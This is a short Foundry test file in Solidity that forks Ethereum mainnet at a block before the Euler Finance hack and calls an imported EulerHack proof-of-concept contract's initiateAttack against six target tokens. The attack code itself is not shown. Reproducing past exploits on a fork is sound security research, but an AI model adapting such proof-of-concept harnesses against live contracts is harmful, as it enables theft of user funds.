pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../pocs/EulerHack.sol";

contract EulerHackTest is Test {
    uint256 mainnetFork;

    EulerHack public eulerHack;

    function setUp() public {
        console.log("[*] Forking chain before the attack at %d", 16_817_995);
        mainnetFork = vm.createFork("eth", 16_817_995);        

        vm.selectFork(mainnetFork);
        eulerHack = new EulerHack();
    }

    function testFlashLoan() public {

        for (uint i = 0; i < 6; i++) {
            eulerHack.initiateAttack(TargetTokens(i));
        }
    }
}
